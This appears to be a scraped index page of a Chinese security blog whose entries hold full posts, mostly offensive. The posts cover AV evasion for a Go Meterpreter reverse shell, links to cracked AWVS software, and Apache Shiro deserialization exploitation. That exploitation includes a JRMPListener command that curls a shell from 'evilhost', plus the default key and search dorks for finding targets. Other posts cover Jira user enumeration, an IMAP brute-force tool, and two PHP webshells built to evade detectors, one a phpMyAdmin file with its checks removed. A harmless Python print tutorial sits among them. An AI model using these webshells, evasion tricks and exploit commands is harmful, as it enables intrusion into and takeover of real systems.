&lt;p&gt;注意上面参数中没有-s，因为实际测试，使用这种方式build后的程序免杀效果会好一些。如果直接go build，程序会有窗口，同时大小也在1.6M左右。&lt;/p&gt;
&lt;p&gt;由于加入了这部分代码，运行后因为执行多次无用代码，需要等一会才可以看到上线。另外目前会出现连接两次msf的情况，但是只有一个连接会返回shell，目前没找到原因。&lt;/p&gt;
&lt;h2 id=&#34;免杀效果&#34;&gt;免杀效果&lt;/h2&gt;
&lt;p&gt;加入了Bypass AV的代码。&lt;/p&gt;
&lt;p&gt;我在刚写好的时候上传到VT，查杀结果位8/62。VT上有超过70个引擎，62个应该是加入BypassAV代码起的作用。&lt;/p&gt;
&lt;p&gt;今天最新经过编译查杀结果为20/70。由于现在杀毒都有云查杀，刚写的时候效果好，但是过几天就被被杀。这里具体可以结合一些其他方式来尝试绕过。&lt;/p&gt;
&lt;p&gt;VT检测结果地址：&lt;a href=&#34;https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection&#34;&gt;https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在使用这个的过程中，Windows10中自带的杀毒软件会拦截。会被动态行为发现。这里仅是过静态查杀测试。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;!-- more --&gt;
">Golang实现的x86下的Meterpreter reverse tcp</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Acunetix-Web-Vulnerability-Scanner-13-cracked/"" data-c="
          &lt;p&gt;今天看到有群里分享Acunetix Web Vulnerability Scanner(AWVS)13的破解版本，这里分享一下～&lt;/p&gt;
&lt;p&gt;Windows下载地址：&lt;br&gt;
&lt;a href=&#34;https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ&#34; title=&#34;百度盘下载地址&#34;&gt;https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Linux 下载地址：&lt;br&gt;
&lt;a href=&#34;https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g&#34;&gt;https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官网介绍地址&lt;br&gt;
&lt;a href=&#34;https://www.acunetix.com/vulnerability-scanner/&#34;&gt;https://www.acunetix.com/vulnerability-scanner/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：工具来源于网络，请自行验证是否存在后门等情况，为了安全考虑建议使用虚拟机运行。&lt;/strong&gt;&lt;/p&gt;
&lt;!-- more --&gt;
">Acunetix Web Vulnerability Scanner（AWVS） 13 破解版</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability-Tool/"" data-c="
          &lt;p&gt;Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。&lt;/p&gt;
&lt;p&gt;工具下载地址：&lt;a href=&#34;https://github.com/insightglacier/Shiro_exploit&#34;&gt;Shiro_Exploit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。&lt;/p&gt;
&lt;h1 id=&#34;环境&#34;&gt;环境&lt;/h1&gt;
&lt;p&gt;Python2.7&lt;/p&gt;
&lt;p&gt;requests&lt;/p&gt;
&lt;p&gt;Jdk 1.8&lt;/p&gt;
&lt;h1 id=&#34;使用说明&#34;&gt;使用说明&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;usage: shiro_exploit.py [-h] -u URL [-t TYPE] [-g GADGET] [-p PARAMS] [-k KEY]

OPTIONS:
-h, --help            show this help message and exit
-u URL, --url URL     Target url.
-t TYPE, --type TYPE  Check or Exploit. Check :1 , Exploit:2 , Find gadget:3
-g GADGET, --gadget GADGET
                        gadget
-p PARAMS, --params PARAMS
                        gadget params
-k KEY, --key KEY     CipherKey

Example: python shiro_exploit.py -u target
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;检测默认只需要使用-u参数即可。&lt;/p&gt;
&lt;p&gt;检测可用gadget的方式可以运行&lt;/p&gt;
&lt;p&gt;python shiro_exploit.py -u http://target/ -t 3 -p &amp;quot;ping -c 2 {dnshost}&amp;quot; -k &amp;quot;kPH+bIxk5D2deZiIxcaaaA==&amp;quot;&lt;/p&gt;
&lt;p&gt;程序执行时会获取dnslog的域名替换  &lt;code&gt;{dnshost}&lt;/code&gt; 这个值。不需要进行修改。目前还没解决windows和linux系统通用性的问题。这里-p自己根据实际情况指定下吧。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1581746645561.png&#34; alt=&#34;检测可用gadget&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;利用的话，可以采用JRMP的方式。也可以根据检测出来的gadge来进行利用。&lt;/p&gt;
&lt;p&gt;服务器：&lt;/p&gt;
&lt;p&gt;java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &#39;curl evilhost/shell –o shell&#39;&lt;/p&gt;
&lt;p&gt;本地：&lt;/p&gt;
&lt;p&gt;python shiro_exploit.py -u http://target/ -t 2 -g JRMPClient -p &amp;quot;remote_host:1099&amp;quot; -k &amp;quot;kPH+bIxk5D2deZiIxcaaaA==&amp;quot;&lt;/p&gt;
&lt;h1 id=&#34;常见问题&#34;&gt;常见问题&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;运行时出现 No module named &#39;Crypto&#39;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;运行如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip uninstall crypto pycryptodome
pip install pycryptodome
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;python安装目录下的\Lib\site-packages，将crypto文件夹的名字改成Crypto。&lt;/p&gt;
&lt;p&gt;如有其它问题或建议欢迎提交至issue。&lt;/p&gt;
&lt;p&gt;工具的思路可以看文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/&#34; title=&#34;Apache Shiro 反序列化漏洞实战&#34;&gt;https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/p&gt;
">Apache Shiro 反序列化漏洞利用工具使用</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/cve-2019-8449-jira-enum-usernames/"" data-c="
          &lt;p&gt;一个很攻击门槛很低的漏洞。可结合其它漏洞配合来进行攻击。&lt;/p&gt;
&lt;p&gt;首先来简单说一下这个漏洞，该漏洞就是在Jira 8.4.0以前的版本，攻击者可以在不经过授权的情况下访问/rest/api/latest/groupuserpicker这个路径来枚举用户。漏洞危害评级中危。&lt;/p&gt;
&lt;p&gt;2020年2月3日在exploit-db上公布了该漏洞利用脚本。地址：&lt;br&gt;
&lt;a href=&#34;https://www.exploit-db.com/exploits/47990&#34;&gt;Jira 8.3.4 - Information Disclosure (Username Enumeration)&lt;/a&gt; 。&lt;/p&gt;
&lt;p&gt;其漏洞很简单，只需要访问 http://target/rest/api/latest/groupuserpicker?query=admin （target为目标jira系统地址）。如果返回的是json字符串就说明存在漏洞。如果返回&amp;quot;You are not authenticated. Authentication required to perform this operation.&amp;quot; 则说明不存在这个漏洞。&lt;/p&gt;
&lt;p&gt;那漏洞应该如何利用呢？&lt;br&gt;
1、通过字典方式，探测用户是否存在。&lt;br&gt;
2、如果存在漏洞，那么一旦匹配到结果，则会返回json格式的字符串，其中包含来用户民、邮箱、和显示的名字信息。在实际测试中发现，请求的参数不一定是用户的全拼，例如我们输入c，也是可以返回相关结果的。我们可以改变query参数的值，从a至z遍历。这样就可以获取系统中的用户名列表。&lt;/p&gt;
&lt;p&gt;通过以上获取信息后，可以进行后续的利用。比如爆破用户密码，邮箱密码，发送钓鱼邮件等等。具体根据实际场景和相关经验进行扩展。&lt;/p&gt;
&lt;h1 id=&#34;相关连接&#34;&gt;相关连接&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/47990&#34;&gt;Jira 8.3.4 - Information Disclosure (Username Enumeration)&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.doyler.net/security-not-included/more-jira-enumeration&#34;&gt;More Jira Enumeration (usernames) – CVE-2019-8449&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://jira.atlassian.com/browse/JRASERVER-69796&#34;&gt;User enumeration through the groupuserpicker api resource - CVE-2019-8449&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
">CVE-2019-8449 Jira 枚举用户漏洞的利用</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/IMAP-Bruteforce-Script/"" data-c="
          &lt;p&gt;IMAP（Internet Mail Access Protocol）以前称作交互邮件访问协议（Interactive Mail Access Protocol），是一个应用层协议。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP/IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。----来源于百度百科&lt;/p&gt;
&lt;p&gt;目前知名企业邮箱（如腾讯企业邮箱）均支持该协议，许多人喜欢用邮件客户端或者手机收发邮件，则大多数会选择开启该服务。在大多数情况下适用。（文末有脚本下载地址）。&lt;/p&gt;
&lt;p&gt;该脚本使用Python开发，2和3版本均可运行。&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1577972620061.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code&gt;usage: imap-bruteforce.py [-h] [-s SERVER] [-p PORT] -d DOMAIN [-u USER]
                          [-o [OUTPUT]]

OPTIONS:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        imap host
  -p PORT, --port PORT  port
  -d DOMAIN, --domain DOMAIN
                        domain
  -u USER, --user USER  user
  -o [OUTPUT], --output [OUTPUT]
                        save the result to text file
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;-h, --help&lt;br&gt;
帮助说明&lt;br&gt;
-s SERVER&lt;br&gt;
imap 服务器地址，默认是imap.exmail.qq.com&lt;br&gt;
-p PORT&lt;br&gt;
imap 服务器端口，默认是imaps的993端口&lt;br&gt;
-d DOMAIN&lt;br&gt;
要爆破的企业域名，该项为必须&lt;br&gt;
-u USER&lt;br&gt;
要爆破的用户名，或者存有用户名的文件列表（一行一个），默认读取当前目录下的email.txt&lt;br&gt;
-o [OUTPUT]&lt;br&gt;
输出的结果文件，默认保存在result.txt&lt;/p&gt;
&lt;p&gt;除此之外，在当前目录下生成logs.txt文件，保存错误以及验证失败的日志信息。方便分析情况。&lt;/p&gt;
&lt;p&gt;下载地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/insightglacier/IMAP_Bruteforce&#34;&gt;https://github.com/insightglacier/IMAP_Bruteforce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;防护&lt;/strong&gt;&lt;br&gt;
作为企业来说，无比要求员工修改默认密码，不要使用若密码，有规律的密码，如键盘密码。以此来降低风险，企业也应定期检查企业内部员工邮箱情况，降低风险，提高企业安全性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">企业邮箱爆破脚本</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/QingtengCloud-Bypass-Php-Webshell/"" data-c="
          &lt;p&gt;上周看到一些朋友在发青藤云的聊天记录，绕过一个发200块红包。周末的时候就简单做了个测试。&lt;br&gt;
首先使用绕过D盾的webshell，发现被标记为恶意。这就有点意思了。我去看了一下聊天记录的内容，看原理是采用的深度学习的方式。猜测是有监督的方式来实现的（仅为猜测）。我这里绕过的思路采用的是，使用开源程序进行修改，带入一句话后门代码。&lt;/p&gt;
&lt;p&gt;记得Phpmyadmin的index.php文件中包含有&lt;code&gt;include ROOT_PATH . $_REQUEST[&#39;target&#39;];&lt;/code&gt;这样的代码，如果不看上下文，这个妥妥的文件包含漏洞。不过上文有过滤和判断处理，导致无法包含任意文件。我将其修改为包含任意文件。同时保留来一些源码，把影响执行的代码注释掉（因为适应多种环境，适用但文件的情况）。&lt;br&gt;
最终修改的代码如下：&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * Main loader script
 *
 * @package PhpMyAdmin
 */
declare(strict_types=1);
/*
use PhpMyAdmin\Controllers\HomeController;
use PhpMyAdmin\Core;
use PhpMyAdmin\DatabaseInterface;
use PhpMyAdmin\Response;
use PhpMyAdmin\Url;
use PhpMyAdmin\Util;
*/
if (! defined(&#39;ROOT_PATH&#39;)) {
    define(&#39;ROOT_PATH&#39;, &#39;&#39;);   //这里做了修改，不影响后门包含文件
}

global $server;

//require_once ROOT_PATH . &#39;libraries/common.inc.php&#39;;

/**
 * pass variables to child pages
 */
$drops = [
    &#39;lang&#39;,
    &#39;server&#39;,
    &#39;collation_connection&#39;,
    &#39;db&#39;,
    &#39;table&#39;,
];
foreach ($drops as $each_drop) {
    if (array_key_exists($each_drop, $_GET)) {
        unset($_GET[$each_drop]);
    }
}
unset($drops, $each_drop);

/**
 * Black list of all scripts to which front-end must submit data.
 * Such scripts must not be loaded on home page.
 */
$target_blacklist =  [
    &#39;import.php&#39;,
    &#39;export.php&#39;,
];

// If we have a valid target, let&#39;s load that script instead
if (! empty($_REQUEST[&#39;target&#39;])
    &amp;amp;&amp;amp; is_string($_REQUEST[&#39;target&#39;])
    &amp;amp;&amp;amp; 0 == strpos($_REQUEST[&#39;target&#39;], &amp;quot;index&amp;quot;)
    //&amp;amp;&amp;amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)   //检查黑名单，注释掉
    //&amp;amp;&amp;amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;], [], true)   //验证page的有效性，也去掉
) {
    include ROOT_PATH . $_REQUEST[&#39;target&#39;];
    exit;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试是否正常使用，确认可用后，上传测试。结果显示为正常。至此绕过完成。下图是结果（2019年12月29日测试结果）。具体如何使用，可以看上一篇绕过D盾的内容。&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1577714187280.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;br&gt;
青藤云这个做的确实不错。绕过的思路还有其他的，我的思路是选择避开eval，assert使用率高的特征，同时在加入一些正常文件代码的方式来绕过。对于还有其它思路，这里仅作为测试研究。另外除了检测以外，还需要考虑误报情况，我测试传的一个正常文件也报恶意了，所以这个也是需要进行权衡的。&lt;/p&gt;
">青藤云Webshell查杀绕过</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Webshellkill-Bypass-Php-Webshell/"" data-c="
          &lt;p&gt;去年分析D盾的查杀规律弄的绕过。&lt;br&gt;
查杀效果：&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1577534683394.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;具体请看代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
function cc(){
    global $b;
    $a =$_GET[$b];  //此处可改成POST方式
    $str =$a;
    return $str;
}
?&amp;gt;
&amp;lt;?php
$b=&amp;quot;url&amp;quot;;
$c=cc();
$aa = $c;

include($aa);

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;传入参数方式：&lt;br&gt;
http://127.0.0.1/test/include.php?url=本地或远程文件名（或者利用data:image/png的这种格式）&lt;br&gt;
例如：&lt;br&gt;
http://127.0.0.1/test/include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==&lt;br&gt;
上看base64,后面为要执行的代码，代码要带&lt;?php，然后将代码进行base64编码传入。这里的例子是&lt;?php phpinfo(); ?&gt;，实战中可以把代码改成一句话，然后使用菜刀连接即可。&lt;/p&gt;
&lt;!-- more --&gt;
">最新绕过D盾的php Webshell</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/python2-to-python3-print/"" data-c="
          &lt;p&gt;时代在发展，技术在进步。没有什么是停止不前的！2019年已经接近尾声，Python2停止更新的时间越来越近。其中比较流行的如 NumPy、Requests 和 TensorFlow 等承诺到 2020 年将停止支持2.x。尽管迁移过程也会花许多时间与精力，但是转Python3是早晚都要面对的。最近在迁移自己的代码到Python3，对于迁移的过程中遇到的情况进行总结。&lt;/p&gt;
&lt;p&gt;首先我们来说一下常用的print。&lt;br&gt;
最明显的区别就在于，我们在2.x版本中的&lt;code&gt;print &amp;quot;hello world&amp;quot;&lt;/code&gt; ，在3.x版本中会报错。必须要以&lt;code&gt;print(&amp;quot;hello world&amp;quot;)&lt;/code&gt;这样的格式。为什么会发生这样的变化呢？下面就让我们来看一下～&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;主要的变化就在于2.x中print是一个语句，我们可以讲要输出的内容直接放到print关键字后面即可。而3.x版本里，print()是一个函数,需要将输出的内容作为参数传递给print函数。&lt;br&gt;
这里我们可以通过help函数来测试下。昨边终端的是2.7版本，右边的为3.7版本&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1577370604020.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到，2.x版本中直接报语法错误，3.x版本中显示来函数的帮助信息。&lt;br&gt;
我们来看一下3.x中的函数说明：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;print(value, ..., sep=&#39; &#39;, end=&#39;\n&#39;, file=sys.stdout, flush=False)

    Prints the values to a stream, or to sys.stdout by default.
    Optional keyword arguments:
    file:  a file-like object (stream); defaults to the current sys.stdout.
    sep:   string inserted between values, default a space.
    end:   string appended after the last value, default a newline.
    flush: whether to forcibly flush the stream.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;value表示要输出的内容，可以有多个，其中用逗号隔开即可。可以使用格式化方法输出，也可以占位符的方式输出。具体转换的类型，可以去查阅相关表格，这里不做过多说明。&lt;br&gt;
例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;print(&amp;quot;123&amp;quot;,&amp;quot;456&amp;quot;,&amp;quot;789&amp;quot;)
print(&amp;quot;My name is %s,I&#39;m %d years old.&amp;quot; % (&#39;Tom&#39;,18))
print(&amp;quot;My name is {0}，,I&#39;m %d years old.{1}&amp;quot;.format(&#39;Tom&#39;, 18))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sep表示要使用的间隔符号，默认逗号隔开的参数会以空格间隔，使用sep参数可以替换成想要的分隔符，如下划线等符号。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;print(&amp;quot;hello&amp;quot;,&amp;quot;world&amp;quot;,sep=&amp;quot;_&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;end表示换行，不加该参数默认是回车，使用end可以控制是否换行，比如：&lt;br&gt;
&lt;code&gt;print(&amp;quot;lines&amp;quot;,end=&amp;quot;&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;file表示输出到的位置，默认是stdout，即输出到控制台。如果要输出到文件，首先需要open打开文件，然后设置打开的文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fp = open(&amp;quot;1.txt&amp;quot;, &amp;quot;w&amp;quot;)
print(&amp;quot;write file&amp;quot;, file=fp)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;flush 指是否立即输出，默认情况下优先存放到缓冲区，系统碰到\n换行的时候会立即输出，没有换行不立即输出，flush=True可在没有换行的情况下立即输出。不过这个目前看不太常用。&lt;/p&gt;
&lt;p&gt;接下来要说的是关于输出的字符类型：&lt;br&gt;
2.x版本的编码问题一直比较蛋疼，2.x版本中有两种字符串类型：Unicode字符串和非Unicode字符串。3.x中只有一种字符串类型,即Unicode字符串。3.x中减少了2.x中比较蛋疼的字符串问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;迁移过程中的代码批量替换&lt;/strong&gt;&lt;br&gt;
可以使用编辑器中的正则替换功能进行批量替换，这里大家使用的不同编辑器可能会存在些差异，可以根据具体情况来定，我这里使用vscode。如下图：&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1577372350489.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
搜索的正则为：&lt;code&gt;print\s*(.*)&lt;/code&gt;&lt;br&gt;
替换的内容为：&lt;code&gt;print($1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里仅仅是第一篇，后续会继续更新。如http处理，字符串差异，异常处理、数据类型等。避免大家在过程中踩坑。大家也有一些场景问题，也可以在评论中发出来。&lt;/p&gt;
">Python2与Python3差异之print</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/"" data-c="
          &lt;p&gt;Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，网络中曝光1.2.4以前的版本存在反序列化漏洞。尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。花了点时间研究了下，并根据网络上的利用脚本改进。主要修改了检测方式，并使利用方式更加简单灵活，使其更具有实战意义，提升其效率。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理&lt;/h2&gt;
&lt;p&gt;Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。&lt;br&gt;
在服务端接收cookie值时，按照如下步骤来解析处理：&lt;br&gt;
1、检索RememberMe cookie 的值&lt;br&gt;
2、Base 64解码&lt;br&gt;
3、使用AES解密(加密密钥硬编码)&lt;br&gt;
4、进行反序列化操作（未作过滤处理）&lt;/p&gt;
&lt;p&gt;在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;strong&gt;漏洞利用条件&lt;/strong&gt;：&lt;br&gt;
由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。&lt;/p&gt;
&lt;p&gt;尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。&lt;/p&gt;
&lt;h2 id=&#34;检测与利用&#34;&gt;检测与利用&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;目标发现与寻找&lt;/strong&gt;&lt;br&gt;
Shrio框架的特征是登录页面的cookie中存在remeberMe=deleteMe（失败时返回的值）的内容。通过该特征发现Shiro的系统有几种方式：&lt;br&gt;
1、在登录页面时，提交表单后看set-cookie是否存在remeberMe=deleteMe。&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1576850458151.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2、在流量中搜索remeberMe=deleteMe。&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1576850445598.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3、通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。&lt;br&gt;
例如fofa的搜索关键词：header=&amp;quot;rememberme=deleteMe&amp;quot;、header=&amp;quot;shiroCookie&amp;quot;&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1576850432970.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞检测&lt;/strong&gt;&lt;br&gt;
漏洞检测的面临的问题：&lt;br&gt;
1、该漏洞无法回显&lt;br&gt;
2、系统环境复杂&lt;br&gt;
3、aes的key可能被修改。&lt;br&gt;
对于第一个问题，可以通过dnslog平台，使用ysoserial的URLDNS Gadget来检测，使用这个Gadget好处就是通用。这种检测也可以解决系统环境复杂的问题。但是这里要注意解析会有ttl值缓存，检测时建议每次随机生成一个子域名。&lt;br&gt;
对于第三个问题，我们可以通过网络收集，文件读取漏洞来获取key。通过github，搜索引擎这里收集到了23个key。&lt;br&gt;
这里列出搜索关键词或者文件路径：&lt;br&gt;
github搜索关键词&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;securityManager.rememberMeManager.cipherKey
cookieRememberMeManager.setCipherKey
setCipherKey(Base64.decode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;配置文件路径或者名&lt;br&gt;
WEB-INF/shiro.ini&lt;br&gt;
ShiroConfig.java&lt;br&gt;
&lt;img src=&#34;https://bacde.me/post-images/1576851004997.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;br&gt;
根据大牛的文章以及实际测试，漏洞利用目前使用jndi和jrmp比较好。使用ysoserial的exploit功能即可。&lt;br&gt;
服务器上执行&lt;br&gt;
&lt;code&gt;java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &#39;curl evilhost/shell –o shell&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。&lt;/p&gt;
&lt;p&gt;漏洞脚本地址：&lt;a href=&#34;https://github.com/insightglacier/Shiro_exploit&#34;&gt;Shiro_exploit&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议&lt;/h2&gt;
&lt;p&gt;1、不要使用硬编码，不要使用硬编码，不要使用硬编码。&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
&lt;p&gt;http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html&lt;br&gt;
https://issues.apache.org/jira/browse/SHIRO-550&lt;br&gt;
https://blog.knownsec.com/2016/08/apache-shiro-java/&lt;br&gt;
https://www.cnblogs.com/loong-hon/p/10619616.html&lt;br&gt;
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&lt;br&gt;
https://www.freebuf.com/vuls/178014.html&lt;br&gt;
https://www.cnblogs.com/peterpan0707007/p/11342997.html&lt;br&gt;
https://github.com/frohoff/ysoserial&lt;/p&gt;
">Apache Shiro 反序列化漏洞实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/about/"" data-c="
          &lt;p&gt;在攻与防的对立与统一中寻求突破。&lt;/p&gt;
&lt;p&gt;一名网络安全爱好者。&lt;/p&gt;
&lt;p&gt;微博：&lt;a href=&#34;https://www.weibo.com/bacde&#34;&gt;https://www.weibo.com/bacde&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;推特:&lt;a href=&#34;https://twitter.com/insightGlacier&#34;&gt;https://twitter.com/insightGlacier&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Github:&lt;a href=&#34;https://github.com/insightglacier&#34;&gt;https://github.com/insightglacier&lt;/a&gt;&lt;/p&gt;
">About</a>
      </div>
      
    </div>
  </div>
</div>
<script>
